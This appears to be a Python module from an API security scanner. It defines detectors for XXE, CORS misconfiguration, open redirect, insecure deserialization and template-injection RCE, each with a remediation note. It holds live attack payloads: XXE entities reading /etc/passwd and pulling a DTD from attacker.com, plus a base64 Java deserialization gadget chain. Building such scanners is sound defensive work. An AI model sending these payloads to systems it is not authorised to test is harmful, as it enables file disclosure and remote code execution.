"""Advanced vulnerability detectors (XXE, RCE, CORS, Open Redirect, Deserialization)."""

import json
import re
from typing import List, Dict, Any
from urllib.parse import urlencode, urlparse

from testing.detector_base import BaseDetector
from testing.models import (
    Vulnerability, VulnerabilityEvidence, VulnerabilitySeverity,
    VulnerabilityCategory, TestPriority
)
from parser.models import APISpecification, APIEndpoint


class XXEDetector(BaseDetector):
    """Detects XML External Entity (XXE) vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="xxe_injection",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.HIGH
        )
        self.description = "Tests for XML External Entity (XXE) injection vulnerabilities"
        
        # XXE payloads
        self.payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>test</data>''',
        ]
        
        # XXE indicators
        self.indicators = [
            r"root:.*:0:0:",  # /etc/passwd
            r"\[extensions\]",  # win.ini
            r"<!ENTITY",
            r"<!DOCTYPE",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect XXE vulnerabilities."""
        vulnerabilities = []
        
        # Only test endpoints that accept XML
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH']:
            vulns = await self._test_xxe_injection(endpoint, auth_headers, base_url)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_xxe_injection(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                                 base_url: str) -> List[Vulnerability]:
        """Test for XXE injection."""
        vulnerabilities = []
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=url,
                    headers={**auth_headers, 'Content-Type': 'application/xml'},
                    body=payload
                )
                
                if self._is_xxe_vulnerable(evidence):
                    vulnerability = self.create_vulnerability(
                        title="XML External Entity (XXE) Injection",
                        description="The endpoint accepts XML input and is vulnerable to XXE injection attacks. "
                                   "Attackers can read arbitrary files, perform SSRF attacks, or cause denial of service.",
                        severity=VulnerabilitySeverity.HIGH,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Disable XML external entity processing. Use secure XML parsers with XXE protection enabled. "
                                  "Consider using JSON instead of XML for data exchange.",
                        cwe_id="CWE-611",
                        cvss_score=8.6
                    )
                    vulnerability.proof_of_concept = f"Payload:\n{payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def _is_xxe_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if response indicates XXE vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body)
        
        for pattern in self.indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False


class CORSMisconfigurationDetector(BaseDetector):
    """Detects CORS misconfiguration vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="cors_misconfiguration",
            category=VulnerabilityCategory.CORS_SECURITY,
            priority=TestPriority.MEDIUM
        )
        self.description = "Tests for CORS misconfiguration vulnerabilities"
        
        # Test origins
        self.test_origins = [
            "http://evil.com",
            "https://attacker.com",
            "null",
            "http://trusted-domain.evil.com",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect CORS misconfigurations."""
        vulnerabilities = []
        
        # Test with different origins
        for origin in self.test_origins:
            vulns = await self._test_cors_origin(endpoint, origin, auth_headers, base_url)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_cors_origin(self, endpoint: APIEndpoint, origin: str,
                               auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test CORS with specific origin."""
        vulnerabilities = []
        
        try:
            url = self.build_url(base_url, endpoint)
            test_headers = {**auth_headers, 'Origin': origin}
            
            evidence = await self.make_request(
                method=endpoint.method,
                url=url,
                headers=test_headers
            )
            
            if self._is_cors_misconfigured(evidence, origin):
                vulnerability = self.create_vulnerability(
                    title="CORS Misconfiguration - Arbitrary Origin Allowed",
                    description=f"The endpoint reflects arbitrary origins in Access-Control-Allow-Origin header, "
                               f"allowing any website to make authenticated requests and read responses. "
                               f"This can lead to unauthorized data access from malicious websites.",
                    severity=VulnerabilitySeverity.MEDIUM,
                    endpoint=endpoint,
                    evidence=[evidence],
                    remediation="Configure CORS to only allow trusted origins. Use a whitelist of allowed origins. "
                              "Avoid using wildcards or reflecting the Origin header without validation.",
                    cwe_id="CWE-942",
                    cvss_score=6.5
                )
                vulnerability.proof_of_concept = f"Test Origin: {origin}\nReflected in Access-Control-Allow-Origin"
                vulnerabilities.append(vulnerability)
                
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def _is_cors_misconfigured(self, evidence: VulnerabilityEvidence, test_origin: str) -> bool:
        """Check if CORS is misconfigured."""
        if not evidence.response_headers:
            return False
        
        # Check if origin is reflected
        acao = evidence.response_headers.get('access-control-allow-origin', '').lower()
        
        # Vulnerable if origin is reflected or wildcard is used with credentials
        if acao == test_origin.lower():
            return True
        
        # Check for wildcard with credentials
        if acao == '*' and evidence.response_headers.get('access-control-allow-credentials') == 'true':
            return True
        
        return False


class OpenRedirectDetector(BaseDetector):
    """Detects Open Redirect vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="open_redirect",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.MEDIUM
        )
        self.description = "Tests for open redirect vulnerabilities"
        
        # Redirect test payloads
        self.payloads = [
            "http://evil.com",
            "https://attacker.com",
            "//evil.com",
            "///evil.com",
            "http://google.com",
            "javascript:alert(1)",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect open redirect vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            param_name = param.get('name', '').lower()
            # Focus on redirect-related parameters
            if any(keyword in param_name for keyword in ['redirect', 'url', 'return', 'next', 'target', 'dest', 'destination']):
                vulns = await self._test_parameter_open_redirect(
                    endpoint, param, auth_headers, base_url
                )
                vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_open_redirect(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                          auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test parameter for open redirect."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                query_string = urlencode({param_name: payload})
                test_url = f"{url}?{query_string}"
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=test_url,
                    headers=auth_headers,
                    allow_redirects=False
                )
                
                if self._is_open_redirect_vulnerable(evidence, payload):
                    vulnerability = self.create_vulnerability(
                        title=f"Open Redirect in parameter '{param_name}'",
                        description=f"The parameter '{param_name}' is vulnerable to open redirect attacks. "
                                   f"Attackers can craft URLs that redirect users to malicious sites, "
                                   f"which can be used for phishing attacks or malware distribution.",
                        severity=VulnerabilitySeverity.MEDIUM,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Validate redirect URLs against a whitelist of allowed domains. "
                                  "Use relative URLs when possible. Warn users before redirecting to external sites.",
                        cwe_id="CWE-601",
                        cvss_score=6.1
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def _is_open_redirect_vulnerable(self, evidence: VulnerabilityEvidence, payload: str) -> bool:
        """Check if response indicates open redirect vulnerability."""
        # Check for redirect status codes
        if evidence.response_status not in [301, 302, 303, 307, 308]:
            return False
        
        # Check if Location header contains our payload
        location = evidence.response_headers.get('location', '')
        
        if payload in location:
            return True
        
        return False


class InsecureDeserializationDetector(BaseDetector):
    """Detects Insecure Deserialization vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="insecure_deserialization",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.CRITICAL
        )
        self.description = "Tests for insecure deserialization vulnerabilities"
        
        # Serialization format indicators
        self.serialization_patterns = [
            r"rO0AB",  # Java serialization (base64)
            r"__pickle",  # Python pickle
            r"__reduce__",  # Python pickle
            r"AC ED 00 05",  # Java serialization (hex)
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect insecure deserialization vulnerabilities."""
        vulnerabilities = []
        
        # Check if endpoint accepts serialized data
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH']:
            vulns = await self._test_deserialization(endpoint, auth_headers, base_url)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_deserialization(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                                   base_url: str) -> List[Vulnerability]:
        """Test for insecure deserialization."""
        vulnerabilities = []
        
        # Test Java serialization
        java_payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9uYW1ldAATW0xqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAB0AANCYXJ0ABZqYXZhL2xhbmcvU3RyaW5nQXJyYXlwdwEAeHg="
        
        try:
            url = self.build_url(base_url, endpoint)
            
            evidence = await self.make_request(
                method=endpoint.method,
                url=url,
                headers={**auth_headers, 'Content-Type': 'application/x-java-serialized-object'},
                body=java_payload
            )
            
            if self._is_deserialization_vulnerable(evidence):
                vulnerability = self.create_vulnerability(
                    title="Insecure Deserialization Vulnerability",
                    description="The endpoint accepts serialized objects which can lead to remote code execution. "
                               "Attackers can craft malicious serialized objects that execute arbitrary code when deserialized.",
                    severity=VulnerabilitySeverity.CRITICAL,
                    endpoint=endpoint,
                    evidence=[evidence],
                    remediation="Avoid deserializing untrusted data. Use safe data formats like JSON. "
                              "If serialization is necessary, implement integrity checks and use allow-lists for allowed classes.",
                    cwe_id="CWE-502",
                    cvss_score=9.8
                )
                vulnerability.proof_of_concept = "Endpoint accepts Java serialized objects"
                vulnerabilities.append(vulnerability)
                
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def _is_deserialization_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if endpoint accepts serialized data."""
        # If the endpoint doesn't reject the serialized payload, it may be vulnerable
        if evidence.response_status not in [400, 415]:
            return True
        
        return False


class RemoteCodeExecutionDetector(BaseDetector):
    """Detects potential Remote Code Execution vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="remote_code_execution",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.CRITICAL
        )
        self.description = "Tests for remote code execution vulnerabilities"
        
        # RCE test payloads for various contexts
        self.payloads = [
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            # Expression language injection
            "${java.lang.Runtime}",
            "#{systemProperties}",
            # Server-side JavaScript
            "'; var x = 1+1; '",
        ]
        
        # RCE indicators
        self.indicators = [
            r"49",  # Result of 7*7
            r"java\.lang\.Runtime",
            r"reflection",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect RCE vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            vulns = await self._test_parameter_rce(
                endpoint, param, auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        # Test request body
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            vulns = await self._test_body_rce(endpoint, auth_headers, base_url)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_rce(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                 auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test parameter for RCE."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                query_string = urlencode({param_name: payload})
                test_url = f"{url}?{query_string}"
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=test_url,
                    headers=auth_headers
                )
                
                if self._is_rce_vulnerable(evidence, payload):
                    vulnerability = self.create_vulnerability(
                        title=f"Potential Remote Code Execution in parameter '{param_name}'",
                        description=f"The parameter '{param_name}' may be vulnerable to code injection. "
                                   f"Server-side code evaluation could allow attackers to execute arbitrary code.",
                        severity=VulnerabilitySeverity.CRITICAL,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Never evaluate user input as code. Use safe alternatives and strict input validation.",
                        cwe_id="CWE-94",
                        cvss_score=9.8
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    async def _test_body_rce(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                           base_url: str) -> List[Vulnerability]:
        """Test request body for RCE."""
        vulnerabilities = []
        
        # Test common fields
        test_fields = ['template', 'expression', 'code', 'eval', 'exec']
        
        for field in test_fields:
            for payload in self.payloads[:3]:
                try:
                    url = self.build_url(base_url, endpoint)
                    body = {field: payload}
                    
                    evidence = await self.make_request(
                        method=endpoint.method,
                        url=url,
                        headers={**auth_headers, 'Content-Type': 'application/json'},
                        body=json.dumps(body)
                    )
                    
                    if self._is_rce_vulnerable(evidence, payload):
                        vulnerability = self.create_vulnerability(
                            title=f"Potential RCE in request body field '{field}'",
                            description=f"The field '{field}' may allow code execution.",
                            severity=VulnerabilitySeverity.CRITICAL,
                            endpoint=endpoint,
                            evidence=[evidence],
                            remediation="Never evaluate user input as code.",
                            cwe_id="CWE-94",
                            cvss_score=9.8
                        )
                        vulnerability.parameter = field
                        vulnerabilities.append(vulnerability)
                        break
                        
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def _is_rce_vulnerable(self, evidence: VulnerabilityEvidence, payload: str) -> bool:
        """Check if response indicates RCE vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body)
        
        # Check for template injection result (7*7 = 49)
        if "{{7*7}}" in payload or "${7*7}" in payload:
            if "49" in response_text and "7*7" not in response_text:
                return True
        
        for pattern in self.indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
